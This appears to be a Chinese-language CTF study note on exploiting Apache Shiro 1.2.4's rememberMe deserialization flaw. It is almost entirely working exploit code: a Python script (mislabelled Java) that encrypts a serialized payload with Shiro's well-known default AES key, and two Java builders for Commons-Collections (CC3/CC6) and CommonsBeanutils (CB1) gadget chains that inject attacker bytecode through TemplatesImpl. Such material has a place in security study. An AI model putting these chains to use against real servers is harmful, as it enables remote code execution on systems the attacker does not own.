# 适用版本
Shiro1.2.4
# 加密脚本
```java
import sys
import base64
import uuid
from random import Random
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename, "rb") as f:
        data = f.read()
    return data

def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext

if __name__ == "__main__":
    data = get_file_data("ser.bin")
    print(aes_enc(data))
```
# CC依赖打Shiro
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class CC3CC6 {
    public static void setField(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static void serialize(Object obj, String fileName) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(fileName));
        oos.writeObject(obj);
    }

    public static void unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        ois.readObject();
    }

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        byte[] code = Files.readAllBytes(Paths.get("F:\\CTF\\JAVA\\Classes\\Exp.class"));
        byte[][] codes = {code};
        setField(templatesImpl, "_name", "Ki1ro");
        setField(templatesImpl, "_bytecodes", codes);
        setField(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        InstantiateTransformer transformers = new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templatesImpl } );


        HashMap map = new HashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, TrAXFilter.class);
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, null);

        map.clear();

        setField(lazyMap, "factory", transformers);
        serialize(hashMap, "ser.bin");
        unserialize("ser.bin");
    }
}

```
# Shiro CB打反序列化（无额外依赖）
```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1Test {
    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        classField.set(obj, fieldValue);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class clazz = obj.getClass();
        Field classField = clazz.getDeclaredField(fieldName);
        classField.setAccessible(true);
        return classField.get(obj);
    }

    public static void serialize(Object obj, String fileName) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(fileName));
        oos.writeObject(obj);
    }

    public static void unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        ois.readObject();
    }

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        byte[] code = Files.readAllBytes(Paths.get("F:\\CTF\\JAVA\\Classes\\Exp.class"));
        byte[][] codes = {code};
        setFieldValue(templatesImpl, "_name", "Ki1ro");
        setFieldValue(templatesImpl, "_bytecodes", codes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(comparator, "comparator", null);
        setFieldValue(queue, "queue", new Object[]{templatesImpl, templatesImpl});

        serialize(queue, "ser.bin");
        unserialize("ser.bin");

    }
}

```
